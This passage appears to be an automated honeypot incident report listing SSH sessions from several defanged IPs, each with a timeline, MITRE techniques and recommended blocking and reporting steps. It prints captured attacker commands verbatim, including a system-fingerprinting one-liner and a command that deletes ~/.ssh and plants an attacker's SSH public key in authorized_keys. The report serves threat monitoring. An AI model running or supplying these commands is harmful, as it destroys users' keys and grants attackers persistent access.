| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:37:52` | `cowrie.session.connect` |
| `2026-09-21 17:37:52` | `cowrie.client.version` |
| `2026-09-21 17:37:52` | `cowrie.client.kex` |
| `2026-09-21 17:37:54` | `cowrie.login.success` |
| `2026-09-21 17:37:55` | `cowrie.session.params` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.success` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.command.input` |
| `2026-09-21 17:37:55` | `cowrie.log.closed` |
| `2026-09-21 17:37:57` | `cowrie.session.params` |
| `2026-09-21 17:37:57` | `cowrie.command.input` |
| `2026-09-21 17:37:57` | `cowrie.log.closed` |
| `2026-09-21 17:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6484791f990

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:39 |
| **Last Seen** | 2026-09-21 17:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:39:04` | `cowrie.session.connect` |
| `2026-09-21 17:39:05` | `cowrie.client.version` |
| `2026-09-21 17:39:05` | `cowrie.client.kex` |
| `2026-09-21 17:39:07` | `cowrie.login.success` |
| `2026-09-21 17:39:08` | `cowrie.session.params` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.success` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:08` | `cowrie.command.input` |
| `2026-09-21 17:39:09` | `cowrie.log.closed` |
| `2026-09-21 17:39:11` | `cowrie.session.params` |
| `2026-09-21 17:39:11` | `cowrie.command.input` |
| `2026-09-21 17:39:11` | `cowrie.log.closed` |
| `2026-09-21 17:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57076e29870

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:40 |
| **Last Seen** | 2026-09-21 17:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:40:10` | `cowrie.session.connect` |
| `2026-09-21 17:40:10` | `cowrie.client.version` |
| `2026-09-21 17:40:10` | `cowrie.client.kex` |
| `2026-09-21 17:40:11` | `cowrie.login.success` |
| `2026-09-21 17:40:12` | `cowrie.session.params` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.success` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.command.input` |
| `2026-09-21 17:40:12` | `cowrie.log.closed` |
| `2026-09-21 17:40:13` | `cowrie.session.params` |
| `2026-09-21 17:40:13` | `cowrie.command.input` |
| `2026-09-21 17:40:13` | `cowrie.log.closed` |
| `2026-09-21 17:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb62be2738af

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:41 |
| **Last Seen** | 2026-09-21 17:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:41:17` | `cowrie.session.connect` |
| `2026-09-21 17:41:17` | `cowrie.client.version` |
| `2026-09-21 17:41:17` | `cowrie.client.kex` |
| `2026-09-21 17:41:19` | `cowrie.login.success` |
| `2026-09-21 17:41:20` | `cowrie.session.params` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.success` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.command.input` |
| `2026-09-21 17:41:20` | `cowrie.log.closed` |
| `2026-09-21 17:41:22` | `cowrie.session.params` |
| `2026-09-21 17:41:22` | `cowrie.command.input` |
| `2026-09-21 17:41:22` | `cowrie.log.closed` |
| `2026-09-21 17:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de10a7ef55a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 17:41 |
| **Last Seen** | 2026-09-21 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:41:58` | `cowrie.session.connect` |
| `2026-09-21 17:41:58` | `cowrie.client.version` |
| `2026-09-21 17:41:58` | `cowrie.client.kex` |
| `2026-09-21 17:41:59` | `cowrie.login.success` |
| `2026-09-21 17:41:59` | `cowrie.direct-tcpip.request` |
| `2026-09-21 17:41:59` | `cowrie.direct-tcpip.data` |
| `2026-09-21 17:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4371d8596cc2

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-21 17:42 |
| **Last Seen** | 2026-09-21 17:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:42:24` | `cowrie.session.connect` |
| `2026-09-21 17:42:24` | `cowrie.client.version` |
| `2026-09-21 17:42:24` | `cowrie.client.kex` |
| `2026-09-21 17:42:24` | `cowrie.login.success` |
| `2026-09-21 17:42:25` | `cowrie.session.params` |
| `2026-09-21 17:42:25` | `cowrie.command.input` |
| `2026-09-21 17:42:25` | `cowrie.command.failed` |
| `2026-09-21 17:42:25` | `cowrie.log.closed` |
| `2026-09-21 17:42:26` | `cowrie.session.params` |
| `2026-09-21 17:42:26` | `cowrie.command.input` |
| `2026-09-21 17:42:26` | `cowrie.session.file_download` |
| `2026-09-21 17:42:26` | `cowrie.log.closed` |
| `2026-09-21 17:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a251a4f10613

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-21 17:42 |
| **Last Seen** | 2026-09-21 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:42:26` | `cowrie.session.connect` |
| `2026-09-21 17:42:26` | `cowrie.client.version` |
| `2026-09-21 17:42:26` | `cowrie.client.kex` |
| `2026-09-21 17:42:26` | `cowrie.login.success` |
| `2026-09-21 17:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307d15dcfa52

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-09-21 17:42 |
| **Last Seen** | 2026-09-21 17:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:42:26` | `cowrie.session.connect` |
| `2026-09-21 17:42:26` | `cowrie.client.version` |
| `2026-09-21 17:42:27` | `cowrie.client.kex` |
| `2026-09-21 17:42:27` | `cowrie.login.success` |
| `2026-09-21 17:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c51613af708

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:43 |
| **Last Seen** | 2026-09-21 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:43:21` | `cowrie.session.connect` |
| `2026-09-21 17:43:21` | `cowrie.client.version` |
| `2026-09-21 17:43:21` | `cowrie.client.kex` |
| `2026-09-21 17:43:21` | `cowrie.login.success` |
| `2026-09-21 17:43:22` | `cowrie.session.params` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.success` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:22` | `cowrie.command.input` |
| `2026-09-21 17:43:23` | `cowrie.log.closed` |
| `2026-09-21 17:43:23` | `cowrie.session.params` |
| `2026-09-21 17:43:23` | `cowrie.command.input` |
| `2026-09-21 17:43:23` | `cowrie.log.closed` |
| `2026-09-21 17:43:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3076c04a16d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:45 |
| **Last Seen** | 2026-09-21 17:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:45:07` | `cowrie.session.connect` |
| `2026-09-21 17:45:07` | `cowrie.client.version` |
| `2026-09-21 17:45:08` | `cowrie.client.kex` |
| `2026-09-21 17:45:11` | `cowrie.login.success` |
| `2026-09-21 17:45:13` | `cowrie.session.params` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.success` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:13` | `cowrie.command.input` |
| `2026-09-21 17:45:14` | `cowrie.log.closed` |
| `2026-09-21 17:45:16` | `cowrie.session.params` |
| `2026-09-21 17:45:16` | `cowrie.command.input` |
| `2026-09-21 17:45:16` | `cowrie.log.closed` |
| `2026-09-21 17:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22a084db9b5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-21 17:45 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:45:49` | `cowrie.session.connect` |
| `2026-09-21 17:45:50` | `cowrie.client.version` |
| `2026-09-21 17:45:50` | `cowrie.client.kex` |
| `2026-09-21 17:45:53` | `cowrie.login.success` |
| `2026-09-21 17:45:55` | `cowrie.session.params` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.success` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.command.input` |
| `2026-09-21 17:45:55` | `cowrie.log.closed` |
| `2026-09-21 17:45:58` | `cowrie.session.params` |
| `2026-09-21 17:45:58` | `cowrie.command.input` |
| `2026-09-21 17:45:59` | `cowrie.log.closed` |
| `2026-09-21 17:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-584ab0483f82

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:19` | `cowrie.session.connect` |
| `2026-09-21 17:46:19` | `cowrie.client.version` |
| `2026-09-21 17:46:19` | `cowrie.client.kex` |
| `2026-09-21 17:46:19` | `cowrie.login.success` |
| `2026-09-21 17:46:20` | `cowrie.session.params` |
| `2026-09-21 17:46:20` | `cowrie.command.input` |
| `2026-09-21 17:46:20` | `cowrie.command.failed` |
| `2026-09-21 17:46:20` | `cowrie.log.closed` |
| `2026-09-21 17:46:21` | `cowrie.session.params` |
| `2026-09-21 17:46:21` | `cowrie.command.input` |
| `2026-09-21 17:46:21` | `cowrie.session.file_download` |
| `2026-09-21 17:46:21` | `cowrie.log.closed` |
| `2026-09-21 17:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e14c5a7b25b

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:21` | `cowrie.session.connect` |
| `2026-09-21 17:46:21` | `cowrie.client.version` |
| `2026-09-21 17:46:21` | `cowrie.client.kex` |
| `2026-09-21 17:46:22` | `cowrie.login.success` |
| `2026-09-21 17:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49eb0d679ad1

| Field | Detail |
|---|---|
| **Source IP** | `46.188.119[.]26` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:22` | `cowrie.session.connect` |
| `2026-09-21 17:46:22` | `cowrie.client.version` |
| `2026-09-21 17:46:23` | `cowrie.client.kex` |
| `2026-09-21 17:46:23` | `cowrie.login.success` |
| `2026-09-21 17:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.188.119[.]26` to AbuseIPDB if not already reported
- [ ] Block `46.188.119[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de86f8d0977d

| Field | Detail |
|---|---|
| **Source IP** | `183.251.230[.]98` |
| **First Seen** | 2026-09-21 17:46 |
| **Last Seen** | 2026-09-21 17:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:46:43` | `cowrie.session.connect` |
| `2026-09-21 17:46:43` | `cowrie.client.version` |
| `2026-09-21 17:46:43` | `cowrie.client.kex` |
| `2026-09-21 17:46:44` | `cowrie.login.success` |
| `2026-09-21 17:46:46` | `cowrie.session.params` |
| `2026-09-21 17:46:46` | `cowrie.command.input` |
| `2026-09-21 17:46:46` | `cowrie.command.failed` |
| `2026-09-21 17:46:46` | `cowrie.log.closed` |
| `2026-09-21 17:46:47` | `cowrie.session.params` |
| `2026-09-21 17:46:47` | `cowrie.command.input` |
| `2026-09-21 17:46:47` | `cowrie.session.file_download` |
| `2026-09-21 17:46:47` | `cowrie.log.closed` |
| `2026-09-21 17:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.251.230[.]98` to AbuseIPDB if not already reported
- [ ] Block `183.251.230[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

